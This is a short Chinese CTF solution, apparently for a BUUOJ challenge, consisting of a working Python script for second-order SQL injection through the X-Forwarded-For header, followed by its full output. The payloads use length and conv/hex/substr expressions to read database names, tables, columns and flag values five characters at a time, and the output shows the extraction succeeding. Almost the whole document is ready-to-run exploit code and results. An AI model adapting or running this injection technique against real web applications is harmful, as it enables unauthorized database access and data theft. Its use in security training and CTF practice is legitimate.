# 一个X-Forwarded-For二次注入脚本

```python
# coding:utf8
#!/usr/bin/env python3

import requests

target = "http://node3.buuoj.cn:28400"

def execute_sql(sql):
    print("[*]请求语句：" + sql)
    return_result = ""

    payload = "0'|length((" + sql + "))|'0"
    session = requests.session()
    r = session.get(target, headers={'X-Forwarded-For': payload})
    r = session.get(target, headers={'X-Forwarded-For': 'glzjin'})
    r = session.get(target, headers={'X-Forwarded-For': 'glzjin'})
    start_pos = r.text.find("Last Ip: ")
    end_pos = r.text.find(" -->", start_pos)
    length = int(r.text[start_pos + 9: end_pos])
    print("[+]长度：" + str(length))

    for i in range(1, length + 1, 5):
        payload = "0'|conv(hex(substr((" + sql + ")," + str(i) + ",5)),16,10)|'0"

        r = session.get(target, headers={'X-Forwarded-For': payload})
        r = session.get(target, headers={'X-Forwarded-For': 'glzjin'})
        r = session.get(target, headers={'X-Forwarded-For': 'glzjin'})
        start_pos = r.text.find("Last Ip: ")
        end_pos = r.text.find(" -->", start_pos)
        result = int(r.text[start_pos + 9: end_pos])
        return_result += bytes.fromhex(hex(result)[2:]).decode('utf-8')

        print("[+]位置 " + str(i) + " 请求五位成功:" + bytes.fromhex(hex(result)[2:]).decode('utf-8'))

    return return_result


# 获取数据库
print("[+]获取成功：" + execute_sql("SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA"))

# 获取数据库表
print("[+]获取成功：" + execute_sql("SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e'"))

# 获取数据库表
print("[+]获取成功：" + execute_sql("SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e' AND TABLE_NAME = 'F4l9_t4b1e' "))

# 获取表中内容
print("[+]获取成功：" + execute_sql("SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e"))

```

结果  
```r
[*]请求语句：SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA
[+]长度：78
[+]位置 1 请求五位成功:infor
[+]位置 6 请求五位成功:matio
[+]位置 11 请求五位成功:n_sch
[+]位置 16 请求五位成功:ema,t
[+]位置 21 请求五位成功:est,m
[+]位置 26 请求五位成功:ysql,
[+]位置 31 请求五位成功:ctftr
[+]位置 36 请求五位成功:ainin
[+]位置 41 请求五位成功:g,per
[+]位置 46 请求五位成功:forma
[+]位置 51 请求五位成功:nce_s
[+]位置 56 请求五位成功:chema
[+]位置 61 请求五位成功:,F4l9
[+]位置 66 请求五位成功:_D4t4
[+]位置 71 请求五位成功:B45e,
[+]位置 76 请求五位成功:ctf
[+]获取成功：information_schema,test,mysql,ctftraining,performance_schema,F4l9_D4t4B45e,ctf
[*]请求语句：SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e'        
[+]长度：10
[+]位置 1 请求五位成功:F4l9_
[+]位置 6 请求五位成功:t4b1e
[+]获取成功：F4l9_t4b1e
[*]请求语句：SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e' AND T
ABLE_NAME = 'F4l9_t4b1e'
[+]长度：11
[+]位置 1 请求五位成功:F4l9_
[+]位置 6 请求五位成功:C01uM
[+]位置 11 请求五位成功:n
[+]获取成功：F4l9_C01uMn
[*]请求语句：SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e
[+]长度：75
[+]位置 1 请求五位成功:flag{
[+]位置 6 请求五位成功:G1zj1
[+]位置 11 请求五位成功:n_W4n
[+]位置 16 请求五位成功:t5_4_
[+]位置 21 请求五位成功:91r1_
[+]位置 26 请求五位成功:Fr1en
[+]位置 31 请求五位成功:d},fl
[+]位置 36 请求五位成功:ag{6c
[+]位置 41 请求五位成功:31517
[+]位置 46 请求五位成功:6-3d8
[+]位置 51 请求五位成功:9-4d5
[+]位置 56 请求五位成功:c-a2a
[+]位置 61 请求五位成功:4-c15
[+]位置 66 请求五位成功:a4aac
[+]位置 71 请求五位成功:df65}
[+]获取成功：flag{G1zj1n_W4nt5_4_91r1_Fr1end},flag{6c315176-3d89-4d5c-a2a4-c15a4aacdf65}

```


2019/11/3  
